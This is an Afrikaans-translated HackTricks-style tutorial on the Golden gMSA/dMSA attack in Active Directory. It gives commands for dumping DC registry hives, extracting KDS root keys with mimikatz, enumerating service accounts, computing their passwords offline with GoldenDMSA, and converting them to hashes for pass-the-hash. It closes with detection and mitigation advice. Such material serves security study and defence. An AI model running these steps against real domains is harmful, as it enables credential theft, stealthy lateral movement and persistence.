# Golden gMSA/dMSA Aanval (Offline Afleiding van Gemanagte Diensrekening Wagwoorde)

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Windows Gemanagte Diensrekeninge (MSA) is spesiale prinsipes wat ontwerp is om dienste te laat loop sonder die behoefte om hul wagwoorde handmatig te bestuur.
Daar is twee hoof variasies:

1. **gMSA** – groep Gemanagte Diensrekening – kan op verskeie gasheer gebruik word wat geoutoriseer is in sy `msDS-GroupMSAMembership` attribuut.
2. **dMSA** – gedelegeerde Gemanagte Diensrekening – die (voorskou) opvolger van gMSA, wat op dieselfde kriptografie staatmaak maar meer granular gedelegeerde scenario's toelaat.

Vir beide variasies is die **wagwoord nie gestoor** op elke Domeinbeheerder (DC) soos 'n gewone NT-hash nie. In plaas daarvan kan elke DC die huidige wagwoord **aflei** ter plaatse van:

* Die woud-wye **KDS Wortelsleutel** (`KRBTGT\KDS`) – lukraak gegenereerde GUID-genaamde geheim, gerepliceer na elke DC onder die `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` houer.
* Die teikenrekening **SID**.
* 'n per-rekening **ManagedPasswordID** (GUID) wat in die `msDS-ManagedPasswordId` attribuut gevind word.

Die afleiding is: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob uiteindelik **base64-gecodeer** en gestoor in die `msDS-ManagedPassword` attribuut.
Geen Kerberos-verkeer of domeininteraksie is nodig tydens normale wagwoordgebruik nie – 'n lidgasheer lei die wagwoord plaaslik af solank dit die drie insette ken.

## Golden gMSA / Golden dMSA Aanval

As 'n aanvaller al drie insette **aflyn** kan verkry, kan hulle **geldige huidige en toekomstige wagwoorde** vir **enige gMSA/dMSA in die woud** bereken sonder om die DC weer aan te raak, wat die volgende omseil:

* Kerberos vooraf-verifikasie / kaartjie versoek logs
* LDAP lees ouditering
* Wagwoord verandering tydperke (hulle kan vooraf bereken)

Dit is analoog aan 'n *Golden Ticket* vir diensrekeninge.

### Voorvereistes

1. **Woud-vlak kompromie** van **een DC** (of Enterprise Admin). `SYSTEM` toegang is genoeg.
2. Vermoë om diensrekeninge te lys (LDAP lees / RID brute-force).
3. .NET ≥ 4.7.2 x64 werkstasie om [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) of ekwivalente kode te loop.

### Fase 1 – Trek die KDS Wortelsleutel uit

Dump van enige DC (Volume Shadow Copy / rou SAM+SECURITY hives of afstandsgeheime):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
Die base64-string gemerk `RootKey` (GUID naam) is nodig in latere stappe.

### Fase 2 – Enumereer gMSA/dMSA objekten

Herwin ten minste `sAMAccountName`, `objectSid` en `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementeer helper-modusse:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### Fase 3 – Raai / Ontdek die ManagedPasswordID (wanneer dit ontbreek)

Sommige implementasies *verwyder* `msDS-ManagedPasswordId` van ACL-beskermde lees. Omdat die GUID 128-bis is, is naïewe bruteforce onmoontlik, maar:

1. Die eerste **32 bits = Unix epocht tyd** van die rekening se skepping (minute resolusie).
2. Gevolg deur 96 ewekansige bits.

Daarom is 'n **smal woordlys per rekening** (± paar uur) realisties.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Die hulpmiddel bereken kandidaat wagwoorde en vergelyk hul base64 blob teen die werklike `msDS-ManagedPassword` attribuut – die ooreenkoms onthul die korrekte GUID.

### Fase 4 – Aflyn Wagwoord Berekening & Omskakeling

Sodra die ManagedPasswordID bekend is, is die geldige wagwoord een opdrag weg:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
Die resulterende hashes kan ingespuit word met **mimikatz** (`sekurlsa::pth`) of **Rubeus** vir Kerberos misbruik, wat stealth **laterale beweging** en **volharding** moontlik maak.

## Opsporing & Versagting

* Beperk **DC rugsteun en registrasie heuning lees** vermoëns tot Tier-0 administrateurs.
* Monitor **Directory Services Restore Mode (DSRM)** of **Volume Shadow Copy** skepping op DC's.
* Oudit lees / veranderinge aan `CN=Master Root Keys,…` en `userAccountControl` vlae van diens rekeninge.
* Ontdek ongewone **base64 wagwoord skrywe** of skielike diens wagwoord hergebruik oor gasheer.
* Oorweeg om hoë-privilege gMSA's na **klassieke diens rekeninge** te omskep met gereelde ewekansige rotasies waar Tier-0 isolasie nie moontlik is nie.

## Gereedskap

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – verwysingsimplementering gebruik in hierdie bladsy.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket met afgeleide AES sleutels.

## Verwysings

- [Golden dMSA – outentikasie omseiling vir gedelegeerde Beheerde Diens Rekeninge](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Semperis/GoldenDMSA GitHub berging](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA vertrou aanval](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
